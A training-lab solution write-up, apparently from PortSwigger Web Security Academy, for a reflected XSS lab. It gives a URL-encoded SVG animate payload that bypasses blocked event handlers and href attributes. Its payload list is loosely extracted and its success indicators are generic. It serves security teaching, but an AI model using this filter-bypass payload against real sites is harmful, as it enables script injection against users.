## Reflected XSS with event handlers andhrefattributes blocked

**Category:** xss_reflected
**Difficulty:** Unknown

### Description
This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchorhrefattributes are blocked.

### Solution Steps
Visit the following URL, replacing
YOUR-LAB-ID
with your lab ID:
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E

### Key Payloads
- `href`
- `alert`
- `<a href="">Click me</a>`
- `YOUR-LAB-ID`
- `https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: xss_reflected

---
*Source: PortSwigger Web Security Academy*
